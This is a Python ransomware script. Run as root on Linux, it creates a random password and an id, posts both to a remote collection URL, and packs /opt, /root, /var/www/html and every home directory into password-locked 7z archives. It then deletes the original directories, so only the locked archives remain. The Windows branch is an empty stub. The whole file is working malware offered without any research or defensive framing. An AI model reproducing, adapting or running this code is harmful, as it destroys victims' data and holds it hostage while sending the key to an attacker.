#!/usr/bin/python3

import os, subprocess, requests, string
from random import randint

class Utils:
    db_url = "" # Example: https://myhosting.com/mydatabase.php - This will receive an 'id' and a 'password' parameters

    def generatePassword():
        chars = string.ascii_letters + string.digits

        password = ""
        for i in range(30):
            password += chars[randint(0, len(chars) - 1)]

        return password

    def generateId():
        chars = string.digits

        id = ""
        for i in range(16):
            id += chars[randint(0, len(chars) - 1)]

        return id
    
    def uploadData(id, password):
        data = {
            "id": id,
            "password": password
        }
        requests.post(Utils.db_url, data=data)

class Linux:
    def compress(directory, outputFile, password):
        print("Compressing files from directory: " + directory)

        compressCommand = [ "7z", "a", outputFile, directory + "/*", "-p" + password ]
        p = subprocess.Popen(compressCommand, stdout=subprocess.DEVNULL)
        p.wait()

    def remove(directory, fullPath, file):
        print("Deleting files from directory: " + directory)
        
        tmpPath = "/dev/shm/" # /dev/shm/ or /tmp/

        mvCommand = [ "mv", fullPath, tmpPath + file ]
        p = subprocess.Popen(mvCommand)
        p.wait()

        rmCommand = [ "rm", "-r", directory ]
        p = subprocess.Popen(rmCommand)
        p.wait()

        mkdirCommand = [ "mkdir", directory ]
        p = subprocess.Popen(mkdirCommand)
        p.wait()

        retCommand = [ "mv", tmpPath + file, directory + "/" + file ]
        p = subprocess.Popen(retCommand)
        p.wait()

    def getDirectories():
        directories = [ "/opt", "/root", "/var/www/html" ]

        home = "/home"
        for df in os.listdir(home):
            d = os.path.join(home, df)
            if os.path.isdir(d) and d != "/home/lost+found":
                directories.append(d)
        
        return directories

    def start():
        id = Utils.generateId()
        password = Utils.generatePassword()

        Utils.uploadData(id, password)

        directories = Linux.getDirectories()

        for directory in directories:
            splitted = directory.split("/")
            file = splitted[len(splitted) - 1] + ".7z"
            rPath = directory + "/" + file

            Linux.compress(directory, rPath, password)
            Linux.remove(directory, rPath, file)
            print()

        print("ID: " + id)
        print("Password: " + password)

class Windows:
    def start():
        # Not implemented yet
        return

if __name__ == "__main__":
    if os.getuid() == 0:
        if os.name == "nt":
            Windows.start()
        elif os.name == "posix":
            Linux.start()
        else:
            print("Unsupported operating system!")
    else:
        print("This script must be run as root or Administrator!")